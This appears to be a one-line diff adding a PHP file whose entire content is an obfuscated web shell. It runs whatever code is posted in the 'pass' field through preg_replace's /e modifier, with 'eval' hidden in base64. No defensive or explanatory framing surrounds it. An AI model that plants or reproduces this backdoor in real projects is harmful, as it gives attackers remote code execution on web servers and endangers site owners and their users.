@@ -1,0 +1,1 @@
+<?php ($zad= $_POST['pass']) && @preg_replace('/ad/e','@'.base64_decode("ZXZhbA==").'($zad)', 'add');?>
